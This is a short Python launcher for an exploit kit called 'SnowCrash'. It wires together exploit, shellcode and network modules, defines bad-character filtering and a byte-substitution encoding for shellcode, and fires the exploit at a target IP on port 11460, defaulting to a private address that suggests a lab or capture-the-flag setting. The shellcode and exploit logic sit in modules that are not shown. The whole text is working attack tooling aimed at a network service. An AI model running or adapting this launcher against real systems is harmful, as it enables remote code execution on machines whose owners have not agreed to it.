import sys

from sc_exploit import SnowCrashExploit
from sc_service import SnowCrashVulnService
from sc_shellcode import SnowCrashShellCode
from sc_net import SnowCrashNet

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} target.ip")
        ip = "192.168.198.10"
    else:
        ip = sys.argv[1]

    sploit = SnowCrashExploit(
        SnowCrashVulnService([
            b"\x00", b"\x09",
            b"\x0a", b"\x0b",
            b"\x0c", b"\x0d",
            b"\x20"
        ]),
        SnowCrashShellCode(
            b"\x00\x09\x0a\x0b\x0c\x0d\x20",
            b"\xff\x10\x06\x07\x08\x05\x1f"
        ),
        SnowCrashNet(
            ip,
            11460
        ),
    )

    sploit.service.Run(sploit)
